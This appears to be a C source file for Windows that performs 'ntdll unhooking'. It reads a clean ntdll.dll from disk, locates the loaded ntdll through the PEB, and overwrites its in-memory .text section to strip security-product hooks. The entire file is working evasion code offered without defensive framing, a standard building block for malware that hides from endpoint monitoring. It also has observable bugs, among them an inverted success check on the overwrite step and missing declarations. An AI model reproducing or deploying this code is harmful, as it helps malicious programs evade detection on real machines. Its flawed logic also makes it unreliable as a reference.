#include <Windows.h>
#include <winternl.h>

int main(){

    LPCSTR lpFileName = "C:\\Windows\\System32\\ntdll.dll";
    
    PBYTE pNtdllUnhooked;
    PVOID dwTextAddressUnhooked;
    SIZE_T dwTextSizeUnhooked;

    DWORD dwTextAddressHooked;
    DWORD dwTextSizeHooked;
    DWORD dwNtdllHookedSize;
    PBYTE pNtdllHooked;
    PVOID pAddressNtdllHooked;

    PVOID pNtdllTxtHooked;
    SIZE_T sNtdllTxtHooked;

    printf("[*] Retrieving Buffer from Ntdll...\n");

    if(!RetrieveBufferFileDisk(lpFileName, &pNtdllUnhooked)){
        return -1;
    }
    
    if(!GetTextSectionUnhooked((PBYTE)pNtdllUnhooked, &dwTextAddressUnhooked, &dwTextSizeUnhooked)){
        return -1;
    }
    printf("\t[*] .text Address from Ntdll Unhooked: 0x%p\n", dwTextAddressUnhooked);
    printf("\t[*] .text Size from Ntdll Unhooked: %zu bytes\n\n", dwTextSizeUnhooked);
    
    printf("[i] Fetching Base Address to NTDLL Hooked...");

    FetchNtdllBaseAddresHooked(&pAddressNtdllHooked);
    if(pAddressNtdllHooked == INVALID_HANDLE_VALUE){
        return -1;
    }
    printf("DONE\n");

    GetTextSectionHooked(pAddressNtdllHooked, &pNtdllTxtHooked, &sNtdllTxtHooked);

    printf("\t[*] .text Address from Ntdll Hooked: 0x%p\n", pNtdllTxtHooked);
    printf("\t[*] .text Size from Ntdll Hooked: %zu bytes\n\n", sNtdllTxtHooked);

    if(ReplaceNtdll(pAddressNtdllHooked, sNtdllTxtHooked, dwTextAddressUnhooked)){
        printf("Error: %lu", GetLastError());
        return -1;
    }

    printf("[+] Replaced Text in NTDLL...");

    return 0;
}

BOOL RetrieveBufferFileDisk( _In_ LPCSTR ntdllName, _Out_ LPVOID* pNtdllImage) {

    HANDLE hNtdll = CreateFileA(ntdllName, GENERIC_READ , FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hNtdll == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileA for ntdll unhooked failed with error: %lu\n", GetLastError());
        goto _CLEANUP;
        return FALSE;
    }

    DWORD ntdllSize = GetFileSize(hNtdll, NULL);

    HANDLE hMapFile = CreateFileMappingA(hNtdll, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, ntdllSize, NULL);
    if (hMapFile == NULL) {
        printf("\t[!] CreateFileMapping for ntdll unhooked failed with error: %lu\n", GetLastError());
        goto _CLEANUP;
        return FALSE;
    }

    *pNtdllImage = MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);
    if (*pNtdllImage == NULL) {
        printf("\t[!] MapViewOfFile for ntdll unhooked failed with error: %lu\n", GetLastError());
        goto _CLEANUP;
        return FALSE;
    }
	printf("\t[*] Mapped Ntdll in memory at 0x%p\n", pNtdllImage);
    return TRUE;


_CLEANUP:
	if (hNtdll)
		CloseHandle(hNtdll);
    if (hMapFile)
		CloseHandle(hMapFile);
	if (*pNtdllImage == NULL)
		return FALSE;
	else
		return TRUE;
}

BOOL GetTextSectionUnhooked(_In_ PBYTE pPE, _Out_ PVOID* pTextAddressUnhooked, _Out_ SIZE_T* szTextSizeUnhooked){

    PVOID textAddress;
    SIZE_T textSize;

    PIMAGE_DOS_HEADER pImageDosHdr = (PIMAGE_DOS_HEADER)pPE;
    if (pImageDosHdr->e_magic != IMAGE_DOS_SIGNATURE){
        printf("[!] Invalid DOS Signature at unhooked ntdll");
		return FALSE;
    }

    PIMAGE_NT_HEADERS pImageNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pPE + pImageDosHdr->e_lfanew);
    
    PIMAGE_SECTION_HEADER pImageSectionHdr = (PIMAGE_SECTION_HEADER)(((PBYTE)pImageNtHdrs) + sizeof(IMAGE_NT_HEADERS));

    textAddress = (PVOID)(pImageNtHdrs->OptionalHeader.BaseOfCode + (ULONG_PTR)pPE);
    textSize = pImageNtHdrs->OptionalHeader.SizeOfCode;

    *pTextAddressUnhooked = textAddress;
    *szTextSizeUnhooked = textSize;

    return TRUE;
}

BOOL FetchNtdllBaseAddresHooked(_Out_ PVOID* pDllBase){

#ifdef _WIN64
	PPEB pPEB = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPEB = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPEB->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	*pDllBase = pLdr->DllBase;
    
    return TRUE;

}

BOOL GetTextSectionHooked(_In_ PVOID pLocalNtdll, _Out_ PVOID* pNtdllHookedTxt, _Out_ SIZE_T* sNtdllHookedTxtSz){
    PIMAGE_DOS_HEADER	pLocalDosHdr	= (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS 	pLocalNtHdrs	= (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) 
        return FALSE;

    PVOID	pLocalNtdllTxt	= (PVOID)(pLocalNtHdrs->OptionalHeader.BaseOfCode + (ULONG_PTR)pLocalNtdll);
    SIZE_T	sNtdllTxtSize	= pLocalNtHdrs->OptionalHeader.SizeOfCode;	

    *pNtdllHookedTxt = pLocalNtdllTxt;
    *sNtdllHookedTxtSz = sNtdllTxtSize;

    return TRUE;
}

BOOL ReplaceNtdll(IN PVOID pTextOriginalNtdll, SIZE_T sTextOriginalNtdll, IN PVOID pTextUnhookedNtdll){

    DWORD dwOldProtection;

	if (!VirtualProtect(pTextOriginalNtdll, sTextOriginalNtdll, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pTextOriginalNtdll, pTextUnhookedNtdll, sTextOriginalNtdll);
	
	if (!VirtualProtect(pTextOriginalNtdll, sTextOriginalNtdll, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    return TRUE;
}